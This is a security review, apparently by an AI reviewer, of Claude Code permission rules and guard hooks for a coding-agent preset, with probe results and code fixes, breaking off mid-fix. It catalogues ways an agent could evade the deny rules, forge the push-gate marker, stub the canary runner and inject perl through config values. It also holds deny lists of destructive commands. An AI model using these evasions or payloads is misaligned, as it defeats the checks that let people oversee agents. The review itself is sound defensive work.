# M-03 fragment ruling (task 3.8)

Reviewer: Fable 5.2 (no fallback needed). Tree: `exp/agnostic` at `0176837`, diff `8cef8b0..HEAD` on `get-shit-done/presets/base/**` and `get-shit-done/bin/project-{registry,profile,profile-keys}.js`. Read-only review; this file is the only repo write.

Evidence classes used below:
- **code**: `file:line` at `0176837`. Paths under `presets/base/` are relative to `get-shit-done/presets/base/`; `bin/` is `get-shit-done/bin/`.
- **probe**: run in `/tmp/m03rev` against a real `project init --preset base` deployment (`GSD_HOME=/tmp/m03rev/home`), hooks driven with hand-built PreToolUse JSON. Canary baseline there: `pass=339 fail=0`.
- **live**: the Claude Code permission matcher of this review session, which carries the same 16 generic deny rows (the igaming project settings). Each command was harmless (tmp repo, dry-run flag, missing remote). Claude Code version not recorded.
- **docs**: code.claude.com/docs `permissions`, `permission-modes`, `hooks`, fetched by a lookup agent. The lookup agent warned that the protected-path, read-only-set and hook-timeout quotes came through a summarising fetch; those are marked *docs, unverified* and each has a probe in section 5.

Verdict: the fragment and hooks are sound as a steer but have **4 HIGH defects** (C1, C2, C3, C5/C6) and 6 smaller ones. 12 changes, 1 of them a new hook. Nothing here needs an owner decision except the two policy points in section 4.

---

## 1. Answers to the nine questions

### Q1. Can any allow rule mutate a file, read a secret or reach the network?

Yes, three ways.

1. **Control-structure rows are command carriers.** `Bash(if *)`, `Bash(then *)`, `Bash(else *)`, `Bash(elif *)`, `Bash(while:*)`, `Bash(until *)`, `Bash(do:*)`, `Bash(case *)`, `Bash(function *)`, `Bash(for:*)` (`settings.fragment.json:33-46`). Each matches a text that starts with the keyword and is followed by any command: `then rm -rf src`, `if curl -d @x https://host`, `do python3 x.py`. The 3.2 forbidden-pattern test does not see them (its pattern has no keyword). Whether the matcher still consults a keyword row is unverified: live, a deny rule fires inside an `if` body (`cd /tmp/m03rev/proj && if true; then git reset --hard; fi` was denied), so the matcher extracts body commands; if it does the same for allow, the rows are dead, if it does not, they allow anything. Dead or dangerous, never useful. Removed in C3.
2. **Write-capable options on read rows.** `git diff|log|show --output=<file>` (`:6-8`), `tree -o <file>` (`:19`), `date -s` (`:27`, root only), and a redirect on every row. Docs: a redirect target gets its own check against Edit rules and working directories. Probe: `git diff --output=.git/.pre-pr-passed` is allowed by the push hook (see Q9). Accepted as a steer (A1).
3. **Secrets.** `cat`, `head`, `tail` are covered by the Read deny rows (docs: Read deny rules apply to "file commands Claude Code recognizes in Bash, such as cat, head, tail, sed, and tee" and to redirect targets). `grep`, `cut`, `tr`, `wc`, `jq` (`:15-20`) are not in that documented list, so `grep -n . .env` is auto-allowed by the fragment's own row. Closed in C5 (rule R6). `echo "$VAR"`, `printf`, `jq -n env` print environment secrets: accepted (A2).

Network: no row reaches it except through item 1.

### Q2. Secret-read deny rows

- **Precedence**: deny wins. Docs: "Rules are evaluated in order: deny, then ask, then allow"; "An allow rule can't carve an exception out of a deny rule." So `Read(**)` (`:4`) never overrides them.
- **Nested `.env`**: not covered. Docs: "`path` or `./path` | Path relative to current directory"; the documented any-depth forms are `Read(.env)` and `Read(**/.env)`. `Read(./.env)` and `Read(./.env.*)` (`:69-70`) are one directory only; `apps/api/.env` is readable.
- **`.env.example`**: blocked at the top level by `Read(./.env.*)` (`*` matches within one segment), and no allow row can restore it. This contradicts the engine's own `.gitignore` (`.env*` plus `!.env.example`, probe) and `project-deploy-render.js:37`.
- **Legitimate work blocked today**: reading and therefore editing `.env.example` (Edit needs a prior Read); every file under any directory named `secrets` (`:71`), which includes source modules (`src/secrets/client.ts`), sealed manifests and docs. A project cannot remove a base deny row: `project sync` re-adds any fragment entry that is missing (`bin/project-deploy-settings.js:81-83`).
- Ruling: C4 replaces the two `.env` rows with any-depth rows for the names that hold real values and leaves templates readable. `Read(**/secrets/**)` stays as planned; its cost is policy point P1.

### Q3. Fail-open or fail-closed

| Case | Verdict | Evidence |
|---|---|---|
| malformed or empty stdin, four perl hooks | closed (exit 2) | `hooks/lib/ShellParse.pm:352-356`; probe: all four deny `{not json` and empty input |
| non-object `tool_input` | closed | perl dies, `hooks/lib/run-perl.sh:8` maps any rc other than 0/2 to 2; probe |
| perl missing | closed, every Bash call | `run-perl.sh:4-5` |
| perl crash | closed | `run-perl.sh:8` |
| flake hook: node missing, crash, malformed stdin | closed | `hooks/check-flake-patterns.sh:7,10`; `hooks/lib/flake-gate.mjs:170-174` |
| jq missing | not applicable | no base hook uses jq; `hooks/lib/fail-closed.sh` is sourced by nothing (git grep: only `preset.json:29-30` names it). C10 |
| `.planning/config.json` present but not JSON | closed for **every** Bash command and **every** Write/Edit, including the edit that repairs the file | `hooks/lib/check-test-command.pl:25-29`; `flake-gate.mjs:180` runs before the file is looked at (`:182-185`); probe: `ls`, `git status`, `git checkout -- .planning/config.json`, Edit and Write of `.planning/config.json` all denied |
| hook runs past the timeout, or the hook file is missing (rc 127) | open | *docs, unverified*: default command-hook timeout 600 s, "a timed-out ... hook doesn't block the tool call", any exit code other than 0/2 is a non-blocking error |
| a `flake_patterns` regex that backtracks | hangs, then open at the timeout | probe: `^(a+)+$` against 40 `a` and `!` did not return in 8 s |

Is each choice right for a first-hour project?
- Missing perl or node blocks all Bash or all Write/Edit with a message naming the tool. Right: a guardrail that cannot run must be loud. GSD itself needs node.
- The flake hook denying on a missing node (source allowed): right, confirmed.
- Push gate active once the 8.7 script exists: right; `-f` on the gate file keeps a project without the script open (`hooks/lib/block-push-without-local-tests.pl:49`, row `@repo-nogate`).
- `check-test-command` and `check-flake-patterns` inert until configured: right.
- **Wrong**: the corrupt-config deadlock. A merge conflict marker in `.planning/config.json` bricks an unattended session; nothing inside the session can repair it. C2.
- **Wrong**: the unbounded regex. C8.
- **Deviation 3.5-1 (merge into `master`)**: worse than reported. On a `master` checkout `git merge feature` is not merely "not asked": the hook returns `permissionDecision: allow` with the reason "git merge into a non-default branch" (probe; `hooks/lib/check-git-merge-target.pl:58` compares only the default branch, `:61-63` then grants). `master` is a second literal at `:35`, `:46`, `:52`. A project whose default branch is `master` and whose owner did not set `stack.branch.default` gets `main` filled in (`bin/project-registry.js:107`) and an auto-approved merge into its real default branch. C7.
- Other commands that move the local default branch (`git pull origin feature`, `cherry-pick`, `rebase`, `branch -f`, `update-ref`, `fetch . x:main`) are not asked (probe). Accepted (A3): every push to the default branch is asked in all probed spellings (`feature:main`, `HEAD:refs/heads/main`, `-u origin main`, `x:refs/heads/master`).

### Q4. Is `[A-Za-z0-9 ._/-]` enough?

Where it is applied, yes. Every rendered site was read: perl single-quoted strings and `eq` compares (`check-git-merge-target.pl:24-58`), perl double-quoted strings and one interpolating heredoc (`:45`, `block-push-without-local-tests.pl:38,49`, `redirect-recursive-search.pl:69-74`), bash double-quoted strings (`canaries/run-canaries.sh:26,31`), JSON strings (`canaries.jsonl`), and the settings tree, which is rendered as parsed JSON (`bin/project-deploy-render.js:63-80`), so a value cannot add a row. The set has no quote, `$`, `@`, backslash, backtick, brace or newline.

**It is applied only on `init`.** `registerForInit` returns `DELEGATE` for any other command (`bin/project-registry.js:155`) and for an init whose slug is absent or invalid (`:161-164`); the engine renders whatever the config holds (`bin/project-deploy.js` plan stage, `renderPreset`). `.planning/config.json` is never managed (`project-deploy-render.js:15`) and any agent can edit it. Probe: with `stack.branch.default` set to `x'; system('id > /tmp/m03rev/pwned'); '` after init, `project diff --preset base` exits 2 and plans `overwrite` for `.claude/hooks/lib/check-git-merge-target.pl`, the runner and the corpus; `project sync` plans the same and is stopped only by the terminal guard. A person who runs `project sync` writes agent-chosen perl into a guarded hook. **HIGH**, C1.

Second defect found by the same probe: **a changed `never_touch` list never reaches the settings.** Slots are derived only in `applyToConfig` (`project-registry.js:82-89, 111`), which runs only on init, and a second init is refused. Probe: adding `kubectl apply -f prod` to `never_touch` after init leaves `slot_3` inert and `project diff` reports `settings: unchanged`. The 3.12 stale-slot test covers a fresh init only. C1 and C6.

`flake_patterns` regex at run time: compiled with `new RegExp(source)` (`flake-gate.mjs:19`), no flags, never evaluated; it can only match or hang (Q3). C8.

Also: a branch name with a space or a leading `-` passes the check and can never equal a real branch, so the merge hook is silently inert; a long `owner_title` is rendered into the approval prompt text. C12.

### Q5. Missing read-only rows

The executor's exclusions are confirmed: `find` (`-delete`, `-exec`), `sed` (`-i`, `w`), `sort` (`-o`), `uniq` (second operand is an output file), `awk` (`system()`), `env` (runs a command), `tee`, bare `git branch` (`-D`, `-f`), `xargs`. None is added.

Docs: Read and Grep need no approval inside the working directory, and a built-in read-only Bash set (`ls cat echo pwd head tail grep find wc which diff stat du cd`, read-only git) runs without a prompt. Glob and LSP are not documented. Rows are still worth having: they make `dontAsk` and headless runs deterministic and do not depend on an undocumented set.

Add (exact rows in C3): tool rows `Grep`, `Glob`, `LSP`; 21 read-only git rows, first of all `Bash(git grep:*)` (the rendered default search command, `project-registry.js:108`, is not allowed today); 20 coreutils rows including `sleep` (wait loops) and `command -v`.

Not addable in base, and the real stall source of an unattended run in default mode: the project's own `test_file`, `typecheck`, `lint`, `format` and gate commands, GSD's `node <...>/gsd-tools.js`, `mkdir -p .tmp`, `git add`, `git commit`. They execute or write, so they are an owner decision at the interview (4.x), not a base row. An allow row must never be rendered from `.planning/config.json` (agent-writable; see Q4): carry-over K3.

### Q6. Changing a deployed hook without `hooks-apply.sh`; the runner outside `.claude/hooks`

The base deployment itself contains nothing that stops an agent from editing `.claude/hooks/**`. Three layers outside it do, and a fourth reports it afterwards:
1. The fork's user-global hook `bin/hooks/gsd-protect-managed-files.js` blocks Write, Edit and Bash writes to `.claude/settings*.json` and `.claude/hooks/` at any depth (`:5-12`, `:46-51`; registered by `bin/install.js:1801-1815`). By its own header (`:14-16`) it matches command text and is not a boundary.
2. Claude Code's protected paths (*docs, unverified*): writes under `.claude` and `.git` are prompted in default and acceptEdits, denied in dontAsk, **allowed in bypassPermissions**.
3. The engine refuses guarded writes outside a terminal (`bin/project-deploy-guard.js:118-126`; probe: `sync` refused with `guardrail paths change only from a terminal outside an agent session`).
4. Detective: `scripts/validation/hook-patch-trailer-check.sh`.

So: yes, with effort (a variable-built path, a script, bypass mode), and the trailer check is what reports it afterwards.

The runner outside `.claude/hooks` **does** open a way to weaken enforcement, and so do three more files. None is covered by layer 1 or by the trailer check (`scripts/validation/hook-patch-trailer-check.sh:21` lists only `.claude/hooks .claude/settings.json`):
- `run-canaries.sh`: `hooks-apply.sh` trusts its exit code (`scripts/hooks-apply.sh:44, 60`).
- `canaries.jsonl` (unguarded on purpose): deleting or flipping a row removes the proof.
- `hooks-apply.sh` and the trailer check themselves.
- `.planning/config.json`: emptying `stack.locked_commands`, `stack.flake_patterns` or `stack.deploy.never_touch` switches three hooks off.

Probe: in a copy, the runner replaced by a two-line stub that prints `pass=339 fail=0`, the corpus truncated, `hooks-apply.sh` replaced by `exit 0`, the lists emptied, all committed without a trailer; the trailer check printed `scanned 0 commit(s) ... 0 without a Hook-Patch trailer`, rc 0. C9 covers the three scripts and row removal. The config lists are accepted as agent-writable (A4).

Gap in the sanctioned path: `hooks-apply.sh:34` accepts only `.claude/hooks/*`, while the trailer check also watches `.claude/settings.json`. A settings or script change has no trailer-stamping path; it arrives by `project sync` from a terminal and the person's commit must carry the trailer. C9 documents that.

### Q7. Row by row

How the matcher treats the rows (live unless marked):
- `X:*` is a prefix with a word boundary. `dropdbx` ran. `git clean -fdx -n` ran against `git clean -fd:*`. `rm -rf /tmp/m03rev/zz-none` ran against `rm -rf /:*`.
- A `*` before the final `:*` is literal: `rm -rf zzz` and `rm -rf proj home` ran, `rm -rf *` was denied.
- A denied command is caught as a later subcommand (`cd d && git reset --hard` denied) and inside an `if` body.
- `command` is stripped (`command sudo -n true` denied). `env` is not (`env sudo -n true` ran). `git -C d reset --hard`, `git -c a.b=c reset --hard` and `bash -c "... git reset --hard"` ran.
- A flag after other arguments is not matched: `git push nowhere x --force` ran; so did `git push --force-with-lease nowhere x`.
- docs: `/usr/bin/x` is not matched by `Bash(x *)`; a deny rule matches past leading `VAR=` assignments.

Rulings: **steer** = accept the row as it is; **row** = add rows (C4); **hook** = the same command in other spellings is caught by a ShellParse rule (C5, C6). Every existing row stays.

| # | Row | Spelling that does the same damage and passes | Ruling |
|---|---|---|---|
| 1 | `Bash(rm -rf /:*)` | `rm -fr /`, `rm -r -f /`, `rm -rf /*`, `rm -rf -- /` | hook R2 |
| 2 | `Bash(rm -rf ~:*)` | `rm -rf ~/`, `rm -rf "$HOME"`, `rm -rf ~/*` | hook R2 |
| 3 | `Bash(rm -rf *:*)` | `rm -rf ./*` (live), `rm -fr *` (live), `rm -rf .`, `rm -rf -- *`, `rm -rf ../*` | hook R2. Residual steer: `find . -delete`, `rm -rf "$DIR/"` with an empty variable |
| 4 | `Bash(git push --force:*)` | `git push origin x --force` (live), `git -C wt push --force`, `git push origin +x` | hook R3 |
| 5 | `Bash(git push -f:*)` | `git push origin x -f`, `git push -uf origin x` | hook R3. `--force-with-lease` stays allowed: it is the spelling an agent should move to (A5) |
| 6 | `Bash(git reset --hard:*)` | `git -C . reset --hard` (live), `git -c a.b=c reset --hard` (live), `bash -c "git reset --hard"` (live) | hook R3. Residual steer: `git checkout -- .`, `git restore .`, `git stash drop` |
| 7 | `Bash(git clean -fd:*)` | `git clean -fdx` (live, dry run), `git clean -f -d` (live, dry run), `git clean -xdf`, `git clean -d --force` | hook R3 (any forced clean that is not a dry run) |
| 8 | `Bash(docker rm:*)` | `docker container rm x`, `docker compose rm` | row `Bash(docker container rm:*)`. `compose rm/down`: steer (the project's own stop command may be `docker compose down`) |
| 9 | `Bash(docker rmi:*)` | `docker image rm x` | row `Bash(docker image rm:*)` |
| 10 | `Bash(docker system prune:*)` | `docker volume prune`, `docker volume rm x` (data loss), `docker image prune -a` | rows `Bash(docker volume rm:*)`, `Bash(docker volume prune:*)`. Image and builder prune: steer (rebuildable) |
| 11 | `Bash(dropdb:*)` | `/usr/bin/dropdb x`, a SQL client running `DROP DATABASE`, the same inside a container | steer. SQL text is unbounded; the stack profile's reset command is the sanctioned path |
| 12 | `Bash(> /dev/sda:*)` | `dd if=/dev/zero of=/dev/sda`, `cat x > /dev/sda` | steer. The row matches only a command that begins with the redirect; a redirect outside the working directories is checked by Claude Code itself (docs). Harmless, kept |
| 13 | `Bash(npm install -g:*)` | `npm i -g x`, `npm install --global x`, `npm install x -g` | rows `Bash(npm i -g:*)`, `Bash(npm install --global:*)`. Trailing `-g` and other package managers: steer (reversible) |
| 14 | `Bash(npm uninstall -g:*)` | `npm rm -g x`, `npm uninstall --global x` | row `Bash(npm uninstall --global:*)`; `npm rm` goes to ask (row 27) |
| 15 | `Bash(sudo npm:*)` | none of its own; subsumed by row 16 | steer (redundant, kept: it is one of the 19 fixed rows) |
| 16 | `Bash(sudo:*)` | `env sudo x` (live), `/usr/bin/sudo x`, `xargs sudo x`, `bash -c "sudo x"`, `doas x` | hook R1 |
| 17 | `Read(./.env)` | `Read apps/api/.env`; `grep -n . .env` | row (replaced, C4) and hook R6 |
| 18 | `Read(./.env.*)` | `Read apps/web/.env.local`; `cut -d= -f2 .env.production`; and it blocks `.env.example` | row (replaced, C4) and hook R6 |
| 19 | `Read(**/secrets/**)` | `jq . secrets/token.json`, `grep -n . config/secrets/x` | hook R6; row kept; P1 |
| 20-24 | `Bash({{stack.deploy.slot_N}}:*)` | `./tools/release.sh prod` (leading `./`), `bash tools/release.sh prod`, `gh workflow run --ref main deploy-prod` (flag before the target), `gh -R o/r workflow run deploy-prod`, `/opt/homebrew/bin/gh workflow run deploy-prod`, the same under `stack-lock.sh --` or `bash -c`; and any entry added to `never_touch` after init (Q4) | hook, C6 (reads `stack.deploy.never_touch` at run time). Residual steer: `cd tools && ./release.sh prod`; `gh workflow run deploy-prod.yml` when the owner listed `deploy-prod` (list the argument as typed); `gh api .../dispatches` |
| 25 | ask `Bash(git rebase:*)` | `git -C wt rebase main`, `git pull --rebase` | hook R4 (ask) |
| 26 | ask `Bash(npm uninstall:*)` | `npm rm x`, `npm remove x` | rows `Bash(npm rm:*)`, `Bash(npm remove:*)`. Other package managers: steer. See P2 |
| 27 | ask `Bash(docker stop:*)` | `docker container stop x`, `docker kill x` | rows `Bash(docker container stop:*)`, `Bash(docker kill:*)` |

### Q8. Registrations and guarded flags

| Registration (`settings.fragment.json`) | Matcher | Wrapper, mode (probe) | Loads | `guarded: true` (`preset.json`) |
|---|---|---|---|---|
| `:91` redirect-recursive-search.sh | `Bash` | 755 | `lib/run-perl.sh`, `lib/ShellParse.pm`, `lib/redirect-recursive-search.pl` | `:14-20`, `:21-27`, `:35-41`, `:42-48` |
| `:95` check-git-merge-target.sh | `Bash` | 755 | `run-perl.sh`, `ShellParse.pm`, `lib/check-git-merge-target.pl` | `:49-55`, `:56-62` |
| `:99` block-push-without-local-tests.sh | `Bash` | 755 | `run-perl.sh`, `ShellParse.pm`, `lib/block-push-without-local-tests.pl` | `:63-69`, `:70-76` |
| `:103` check-test-command.sh | `Bash` | 755 | `run-perl.sh`, `ShellParse.pm`, `lib/check-test-command.pl` | `:77-83`, `:84-90` |
| `:112` check-flake-patterns.sh | `Write\|Edit` | 755 | `lib/flake-gate.mjs` | `:91-97`, `:98-104` |

All five commands resolve to deployed executables; all 13 files under `.claude/hooks/` and the three scripts (`:105-111`, `:119-125`, `:126-132`) are `guarded: true`; `canaries.jsonl` is not (`:112-118`). Probe: the engine's `guarded_changes` list holds the 13 hook files, `.claude/settings.json` and the three scripts. `lib/fail-closed.sh` (`:28-34`) is guarded and loaded by nothing: C10.

Matcher `Write|Edit`: docs (quoted matcher table): a matcher made only of letters, digits, `_`, `-`, spaces, `,` and `|` is an exact name or a list of exact names, so it is `Write` and `Edit` only. `NotebookEdit` is not matched; the hook exits 0 for any other tool anyway (`flake-gate.mjs:175`, probe). Accepted (A6).

### Q9. The marker under the git dir

**Can a session create it without the gate script? Yes.** The write block (`block-push-without-local-tests.pl:17-36`) is a list of writer commands. Probe, all allowed by the hook:
`M=.pre-pr; touch .git/$M-passed` · `git bundle create .git/.pre-pr-passed HEAD` · `git diff --output=.git/.pre-pr-passed` (also auto-allowed by `Bash(git diff:*)`) · `git config --file .git/.pre-pr-passed a.b c` · `curl -s -o .git/.pre-pr-passed file:///dev/null` · `sort -o .git/.pre-pr-passed /dev/null` · `python3 -c "open('.git/.pre-pr-' + 'passed','w')"` · appending a marker write to the gate script itself. The Write tool is not hooked; Claude Code's own `.git` protection prompts for it (*docs, unverified*; allowed in bypassPermissions).
Denied as intended (probe): `touch .git/.pre-pr-passed`, `touch "$(git rev-parse --absolute-git-dir)/.pre-pr-passed"`, `cd .git && touch .pre-pr-passed`.
The code says so itself (`:15-16`: "Guardrail for honest agents, not a boundary"); the wrapper header does not (`hooks/block-push-without-local-tests.sh:2-3`: "keep the marker unforgeable by agents"). Ruling: accept as a steer, correct the header (C11). Inverting the rule (deny every command that names the marker) would block commit messages and searches that mention it. The real control is CI and branch protection on the remote.

**Is the per-worktree location right? Yes.** Probe with a linked worktree (`git rev-parse --absolute-git-dir` = `<main>/.git/worktrees/rgate-wt`): a marker in the main git dir allows a push from the main checkout and blocks one from the worktree; a marker in the worktree's git dir does the reverse; `git -C <other> push` follows the target's git dir in both directions; `GIT_DIR=<other>/.git git push` is judged by the cwd repo and denied. A gate result belongs to one working tree, so one marker per worktree is correct.

Not ruled here (carry-over K1): the marker is fresh for 30 minutes whatever is committed after the gate ran (`:53`), and it is not bound to the pushed ref.

---

## 2. CHANGES (for the implementer)

Order: C1, C2, C6, C5, C7, C8, C3, C4, C9, C10, C11, C12, then the shared test updates at the end. C5 and C6 are hook logic with a canary matrix: dispatch them to Sonnet, as 3.9 and 3.11 were; the rest is Haiku work. After every change: canary runner green, `ShellParse.pm` still byte-equal, full gate.

### C1 (HIGH) Validate rendered values and re-derive deploy slots on every engine command
File `bin/project-registry.js` (the engine is not edited).
1. In `initWithRegistration` (`:216`), before `registerForInit`: when `args[0]` is `init`, `diff` or `sync` and `parseInitRoot(args.slice(1))` gives a root whose profile loads without error, compute `validateProfile(loaded).invalid` and keep the entries whose key is `project.owner_title`, `stack.branch.default`, `stack.commands.search`, `stack.commands.pre_pr_gate`, `stack.deploy` or starts with `stack.deploy.`. If any remain, return `{ exitCode: 1, result: { ok: false, errors: [{ reason: '<key>: <reason>' }, ...] } }` without running the engine. This also closes the init path that delegates when the slug is absent or invalid (`:161-164`).
2. Same place, for `diff` and `sync` only: read `.planning/config.json`; when `config.stack` is an object and any `stack.deploy.slot_N` differs from `deploySlots(never_touch)` (`:84-89`; absent slots count as different only when `stack.deploy` exists or the list is non-empty), write the config with the five slots re-derived (existing `writeJson`), then run the engine. The list stays the source after init.
Tests (`bin/project-registry.test.js` for the pure part, `bin/preset-base.test.js` for the CLI):
- init a tmp project; set `stack.branch.default` to `x'; system('id'); '`; `project diff --preset base` and `project sync --preset base` each exit 1 naming `stack.branch.default`; no file under the project changes (compare a recursive hash).
- same for `project.owner_title: 'a"b'`, `stack.commands.search: 'x; y'`, `stack.deploy.slot_3: 'a)b'`.
- an init whose config has no `project.slug` and a bad `stack.branch.default` exits 1 naming the key.
- init with `never_touch: ["tools/release.sh prod"]`; add `"kubectl apply -f prod"`; `project diff --preset base` rewrites `slot_2` in the config and reports `Bash(kubectl apply -f prod:*)` under `settings.added.permissions.deny`; removing an entry turns its slot back into `gsd-unused-deploy-entry-N`.
Mutants: m1 the check runs for `init` only; m2 slots re-derived for `sync` only; m3 the key filter drops `stack.deploy.`. Each killed by a named test.

### C2 (HIGH) A corrupt `.planning/config.json` must stay repairable
1. `hooks/lib/flake-gate.mjs`, `hookMain` (`:177-185`): resolve the target before the config is loaded and let the config file through.
```js
  const root = toplevel(cwd);
  if (root === null) process.exit(0);
  const file = input.tool_input.file_path ?? input.tool_input.path;
  const rel = isNonEmptyString(file) ? relativeToRoot(root, cwd, file) : null;
  // The edit that repairs an unusable config must get through, or the session cannot recover.
  if (rel === '.planning/config.json') process.exit(0);
  const config = loadFlakeConfig(root);
  if (config === null) process.exit(0);
  if (rel === null) process.exit(0);
  if (!matchesGlobs(rel, config.testGlobs)) process.exit(0);
```
2. `hooks/lib/check-test-command.pl:11`: the fail-closed message gains a second line: `  Repair .planning/config.json with the Edit or Write tool; Bash stays blocked until it parses.`
3. `flake-gate.mjs:163`: the deny message gains ` (repair .planning/config.json with the Edit or Write tool)` when the error is a `ConfigError`.
Canary rows (corpus, hook `check-flake-patterns.sh`, cwd `@repo-badcfg`): `Edit` of `.planning/config.json` → allow; `Write` of `.planning/config.json` → allow; `Write` of `README.md` → deny, reason `not valid JSON`. One row for `check-test-command.sh`, cwd `@repo-badcfg`, `ls` → deny, reason `Repair .planning/config.json`.
Process test: a tmp project whose config is `<<<<<<< HEAD\n{}`: Bash `ls` denied naming the repair path; Edit of the config allowed; after the file is valid JSON again, `ls` is allowed. Mutant: the exemption removed → the test fails.

### C3 (HIGH) Allow rows of `settings.fragment.json`
Remove these 14 rows (`:33-46`): `Bash(if *)`, `Bash(then *)`, `Bash(else *)`, `Bash(elif *)`, `Bash(fi *)`, `Bash(fi)`, `Bash(case *)`, `Bash(esac *)`, `Bash(for:*)`, `Bash(while:*)`, `Bash(until *)`, `Bash(do:*)`, `Bash(done)`, `Bash(function *)`. Keep `Bash(return *)`, `Bash(exit *)`, `Bash(break *)`, `Bash(continue *)`.
Add, in this order after `Read(**)`: `Grep`, `Glob`, `LSP`.
Add after `Bash(git check-ignore:*)`:
`Bash(git grep:*)`, `Bash(git ls-files:*)`, `Bash(git ls-tree:*)`, `Bash(git cat-file:*)`, `Bash(git blame:*)`, `Bash(git merge-base:*)`, `Bash(git rev-list:*)`, `Bash(git describe:*)`, `Bash(git for-each-ref:*)`, `Bash(git show-ref:*)`, `Bash(git branch --show-current)`, `Bash(git branch --list:*)`, `Bash(git branch -a)`, `Bash(git branch -vv)`, `Bash(git symbolic-ref --short HEAD)`, `Bash(git remote -v)`, `Bash(git remote get-url:*)`, `Bash(git worktree list:*)`, `Bash(git stash list:*)`, `Bash(git tag --list:*)`, `Bash(git config --get:*)`.
Add after `Bash(type:*)`:
`Bash(stat:*)`, `Bash(file:*)`, `Bash(du:*)`, `Bash(df:*)`, `Bash(diff:*)`, `Bash(cmp:*)`, `Bash(comm:*)`, `Bash(nl:*)`, `Bash(column:*)`, `Bash(realpath:*)`, `Bash(readlink:*)`, `Bash(uname:*)`, `Bash(shasum:*)`, `Bash(sha256sum:*)`, `Bash(pgrep:*)`, `Bash(sleep:*)`, `Bash(command -v:*)`, `Bash(true)`, `Bash(false)`, `Bash(whoami)`.
Allow count: 47 − 14 + 3 + 21 + 20 = 77.
Tests: the 3.2 set-equality test; the forbidden-pattern test gains a second assertion: no allow entry matches `/^Bash\((?:if|then|else|elif|fi|case|esac|for|while|until|do|done|function)\b/`, and no allow entry equals `Bash(git branch:*)`, `Bash(find:*)`, `Bash(sed:*)`, `Bash(sort:*)`, `Bash(uniq:*)`, `Bash(awk:*)`, `Bash(env:*)`, `Bash(tee:*)`.

### C4 (MED) Deny and ask rows of `settings.fragment.json`
Deny: remove `Read(./.env)` and `Read(./.env.*)`. Add in their place:
`Read(**/.env)`, `Read(**/.env.local)`, `Read(**/.env.*.local)`, `Read(**/.env.development)`, `Read(**/.env.production)`, `Read(**/.env.staging)`, `Read(**/.env.test)`, `Read(**/.env.dev)`, `Read(**/.env.prod)`. Keep `Read(**/secrets/**)`.
Deny: add after `Bash(docker system prune:*)`: `Bash(docker container rm:*)`, `Bash(docker image rm:*)`, `Bash(docker volume rm:*)`, `Bash(docker volume prune:*)`. Add after `Bash(npm uninstall -g:*)`: `Bash(npm i -g:*)`, `Bash(npm install --global:*)`, `Bash(npm uninstall --global:*)`.
Ask: add `Bash(npm rm:*)`, `Bash(npm remove:*)`, `Bash(docker container stop:*)`, `Bash(docker kill:*)`.
Counts: fixed deny 19 − 2 + 9 + 4 + 3 = 33, plus 5 slots = 38; ask 7.
Tests: the 3.2 and 3.12 set-equality and count assertions; one unit test that no deny entry matches `/^Read\(\.\//` and that no deny entry matches `.env.example`, `.env.sample` or `.env.template` under gitignore semantics (assert on the literal list: none of the nine rows ends in `.*` alone).
The exception file `tests/fixtures/agnostic/base-deployed-exceptions.json` holds line numbers of the `docker` rows in `.claude/settings.json` and in the manifest copy: recompute them from the deployed files (6 more `docker` lines in each).

### C5 (HIGH) New hook `check-denied-command`: the tokenised twin of the deny and ask rows
New files:
- `presets/base/hooks/check-denied-command.sh`, mode 755:
```bash
#!/bin/bash
# Hook: check-denied-command.sh. Logic: lib/check-denied-command.pl, tokeniser: lib/ShellParse.pm.
# The settings deny and ask rows stop one literal spelling; this stops the same commands behind `git -C`, a trailing
# or split flag, `env`, `bash -c` or a path prefix. A steer, not a boundary. Unreadable input or a crash: exit 2.
PATH="$PATH:/usr/bin:/bin"
. "${BASH_SOURCE[0]%/*}/lib/run-perl.sh" check-denied-command
```
- `presets/base/hooks/lib/check-denied-command.pl`: the reference implementation in section 6 (prototype run in `/tmp/m03rev/protohooks`: 79 of 79 spellings as expected, 78 of them listed in M1, and the existing 339 rows still pass with it as a fifth Bash hook).
Wiring:
- `preset.json`: two entries after the `check-test-command` pair: wrapper `kind: whole, render: false, guarded: true`; `.pl` `kind: whole, render: true, guarded: true`.
- `settings.fragment.json`: fifth command in the `Bash` group, after `check-test-command.sh`.
- `canaries/run-canaries.sh:57`: append `check-denied-command.sh` to `BASH_HOOKS`.
Canary rows: every line of matrix M1 (section 7) becomes one row `{"hook":"check-denied-command.sh","expect":…,"tool":"Bash","input":{"command":…},"cwd":"@repo-feature","label":…,"class":"review-3.8"}` with the `reason` given per group; plus one `raw` fail-closed row (`{not json`, reason `not valid JSON`) and one non-object `tool_input` row (reason `crashed`). All 82 `@bash-all` rows must still pass; a row that this hook denies is a finding to resolve, never a row to drop.
Tests (`preset-base.test.js`, new describe "3.8 check-denied-command"): one process test per rule R1-R6 (deny spelling, allowed neighbour); ask JSON names the rendered owner title; malformed stdin and non-object input fail closed; the runner is green and a flipped row of this hook fails it; row count of the hook equals the matrix size + 2.
Mutants (each killed by a named test): R1 prefix check removed; R2 `$recursive` forced to 1 (kills `rm *` allow) and `$ROOT_LIKE` narrowed to `/`; R3 push check limited to the first argument; R3 dry-run exemption removed; R4 ask turned into exit 0; R6 template exemption removed; R6 redirect targets ignored.

### C6 (HIGH) `stack.deploy.never_touch` enforced at run time in `check-test-command.pl`
The five rendered rows stay. The hook reads the list from the same config it already loads, so a changed list works without a sync and other spellings are caught.
Replace `hooks/lib/check-test-command.pl:35-43` with:
```perl
sub literals {    # a list of non-empty strings as token lists; absent: none; any other shape: fail closed
  my ($v, $key) = @_;
  return () unless defined $v;
  fail_closed("$key must be an array of non-empty strings") unless ref $v eq 'ARRAY';
  return map { fail_closed("$key must be an array of non-empty strings") if !is_string($_) || $_ !~ /\S/; [split ' ', $_] } @$v;
}
my @literals = literals($stack->{locked_commands}, 'stack.locked_commands');
my $deploy = $stack->{deploy};
fail_closed('stack.deploy must be an object') if defined $deploy && ref $deploy ne 'HASH';
my @never = literals(($deploy // {})->{never_touch}, 'stack.deploy.never_touch');
exit 0 unless @literals || @never;
```
Replace `tok_eq` (`:53-57`) with:
```perl
sub tok_eq {    # a literal token equals a word, a path word that ends with it, or (slash-less literal) the basename of a path word
  my ($lit, $word) = @_;
  return 1 if $word eq $lit;
  return 0 unless $word =~ m{/};
  return $lit =~ m{/} ? ($word =~ m{(?:^|/)\Q$lit\E$} ? 1 : 0) : (base($word) eq $lit ? 1 : 0);
}
```
Replace the head of the entry loop (`:69-73`) with:
```perl
for my $e (@entries) {
  my @r = words_of($e);
  next unless @r;
  my $data = $DATA{ base($r[0]) };
